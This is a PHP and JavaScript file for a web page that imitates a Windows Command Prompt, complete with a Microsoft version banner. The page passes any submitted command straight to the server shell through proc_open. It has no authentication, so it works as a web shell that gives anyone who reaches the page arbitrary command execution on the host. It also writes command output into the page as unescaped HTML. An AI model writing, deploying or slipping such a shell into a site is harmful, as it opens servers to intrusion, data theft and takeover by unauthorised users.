<?php
session_start();

// Initialize working directory in session if not set
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

function formatWindowsPath($path) {
    return str_replace('/', '\\', $path);
}

function executeCommand($command) {
    // Get current working directory
    $cwd = $_SESSION['cwd'];
    
    // Split command into parts
    $parts = array_values(array_filter(explode(' ', trim($command))));
    $baseCommand = strtolower($parts[0] ?? '');
    
    // Windows command mappings
    switch($baseCommand) {
        case 'dir':
            // Handle dir command with proper Windows formatting
            $path = isset($parts[1]) ? $parts[1] : '.';
            $fullPath = realpath($cwd . DIRECTORY_SEPARATOR . $path);
            
            if ($fullPath === false) {
                return "The system cannot find the path specified.";
            }
            
            $output = " Directory of " . formatWindowsPath($fullPath) . "\n\n";
            
            // Get directory contents
            $items = scandir($fullPath);
            $dirs = [];
            $files = [];
            
            foreach ($items as $item) {
                if ($item != "." && $item != "..") {
                    $fullItemPath = $fullPath . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($fullItemPath)) {
                        $dirs[] = [
                            'name' => $item,
                            'date' => date("d/m/Y  H:i", filemtime($fullItemPath)),
                            'size' => "<DIR>"
                        ];
                    } else {
                        $files[] = [
                            'name' => $item,
                            'date' => date("d/m/Y  H:i", filemtime($fullItemPath)),
                            'size' => filesize($fullItemPath)
                        ];
                    }
                }
            }
            
            // Add . and .. directories
            $output .= date("d/m/Y  H:i") . "    <DIR>          .\n";
            $output .= date("d/m/Y  H:i") . "    <DIR>          ..\n";
            
            // Output directories
            foreach ($dirs as $dir) {
                $output .= sprintf("%s    %s    %s\n",
                    $dir['date'],
                    str_pad($dir['size'], 10, " ", STR_PAD_LEFT),
                    $dir['name']
                );
            }
            
            // Output files
            foreach ($files as $file) {
                $output .= sprintf("%s    %s    %s\n",
                    $file['date'],
                    str_pad(number_format($file['size']), 10, " ", STR_PAD_LEFT),
                    $file['name']
                );
            }
            
            $output .= sprintf("\n     %d File(s)    %s bytes\n",
                count($files),
                number_format(array_sum(array_column($files, 'size')))
            );
            $output .= sprintf("     %d Dir(s)     %s bytes free\n",
                count($dirs),
                number_format(disk_free_space($fullPath))
            );
            
            return $output;
            
        case 'cd':
        case 'chdir':
            $newPath = isset($parts[1]) ? $parts[1] : getcwd();
            
            if ($newPath === '..') {
                $newPath = dirname($cwd);
            } elseif ($newPath[0] !== '/' && $newPath[1] !== ':') {
                $newPath = $cwd . DIRECTORY_SEPARATOR . $newPath;
            }
            
            $realPath = realpath($newPath);
            
            if ($realPath !== false && is_dir($realPath)) {
                $_SESSION['cwd'] = $realPath;
                return ''; // CD command doesn't output on success in Windows
            } else {
                return "The system cannot find the path specified.";
            }
            
        case 'pwd':
        case 'echo':
            if (isset($parts[1]) && strtolower($parts[1]) === '%cd%') {
                return formatWindowsPath($cwd);
            }
            // Fall through to default for other echo commands
            
        default:
            // For other commands, execute in current directory
            $descriptorspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
            );
            
            $process = proc_open('cd /d ' . escapeshellarg($cwd) . ' && ' . $command, $descriptorspec, $pipes);
            
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                $error = stream_get_contents($pipes[2]);
                
                foreach ($pipes as $pipe) {
                    fclose($pipe);
                }
                
                proc_close($process);
                
                if ($error) {
                    return "Error: " . $error;
                }
                return $output ?: "";
            }
            return "The system cannot find the command specified.";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'] ?? '';
    
    if (empty($command)) {
        echo json_encode([
            'output' => 'The system cannot find the command specified.',
            'cwd' => formatWindowsPath($_SESSION['cwd']),
            'status' => 'error'
        ]);
        exit;
    }
    
    $output = executeCommand($command);
    
    echo json_encode([
        'output' => nl2br($output),
        'cwd' => formatWindowsPath($_SESSION['cwd']),
        'status' => 'success'
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows Command Prompt</title>
    <style>
        :root {
            --bg-color: #0C0C0C;
            --text-color: #CCCCCC;
            --prompt-color: #CCCCCC;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Consolas', 'Lucida Console', monospace;
            line-height: 1.2;
            height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 0;
        }

        .terminal-container {
            flex: 1;
            overflow: hidden;
            padding: 10px;
        }

        .terminal-body {
            height: calc(100vh - 20px);
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .output-container {
            margin-bottom: 4px;
        }

        .command-line {
            color: var(--prompt-color);
        }

        .output-content {
            color: var(--text-color);
        }

        .command-input {
            background: transparent;
            border: none;
            color: var(--text-color);
            font-family: 'Consolas', 'Lucida Console', monospace;
            font-size: inherit;
            padding: 0;
            width: 100%;
            outline: none;
        }

        ::-webkit-scrollbar {
            width: 12px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-color);
        }

        ::-webkit-scrollbar-thumb {
            background: #666;
            border: 3px solid var(--bg-color);
            border-radius: 6px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #888;
        }
    </style>
</head>
<body>
    <div class="terminal-container">
        <div class="terminal-body" id="terminal-body">
            <div id="output">Microsoft Windows [Version 10.0.19045.3803]<br>(c) Microsoft Corporation. All rights reserved.<br><br></div>
        </div>
    </div>

    <script>
        let currentDir = "<?php echo addslashes(formatWindowsPath($_SESSION['cwd'])); ?>";
        let commandHistory = [];
        let historyIndex = -1;
        let currentInput = null;

        function createInput() {
            if (currentInput) {
                currentInput.removeEventListener('keydown', handleKeyDown);
                currentInput.removeEventListener('blur', handleBlur);
            }

            const outputDiv = document.getElementById('output');
            outputDiv.insertAdjacentHTML('beforeend', `<div class="command-line">${currentDir}></div>`);
            
            const input = document.createElement('input');
            input.type = 'text';
            input.className = 'command-input';
            input.autocomplete = 'off';
            input.spellcheck = false;
            
            outputDiv.appendChild(input);
            input.focus();
            
            input.addEventListener('keydown', handleKeyDown);
            input.addEventListener('blur', handleBlur);
            
            currentInput = input;
            scrollToBottom();
        }

        function handleKeyDown(event) {
            if (event.key === 'Enter') {
                const command = this.value;
                if (!command.trim()) {
                    event.preventDefault();
                    this.remove();
                    createInput();
                    return;
                }

                event.preventDefault();
                this.remove();
                
                if (command.trim()) {
                    commandHistory.unshift(command);
                    historyIndex = -1;
                }

                const outputDiv = document.getElementById('output');
                
                fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: 'command=' + encodeURIComponent(command)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.output) {
                        outputDiv.insertAdjacentHTML('beforeend', `<div class="output-content">${data.output}</div>`);
                    }
                    if (data.cwd) {
                        currentDir = data.cwd;
                    }
                    createInput();
                })
                .catch(error => {
                    outputDiv.insertAdjacentHTML('beforeend', 
                        `<div class="output-content">Error: ${error.message}</div>`
                    );
                    createInput();
                });
            }
            else if (event.key === 'ArrowUp') {
                event.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex];
                }
            }
            else if (event.key === 'ArrowDown') {
                event.preventDefault();
                if (historyIndex > -1) {
                    historyIndex--;
                    this.value = historyIndex === -1 ? '' : commandHistory[historyIndex];
                }
            }
        }

        function handleBlur(event) {
            event.target.focus();
        }

        function scrollToBottom() {
            const terminal = document.getElementById('terminal-body');
            terminal.scrollTop = terminal.scrollHeight;
        }

        // Initialize the terminal
        createInput();
    </script>
</body>
</html>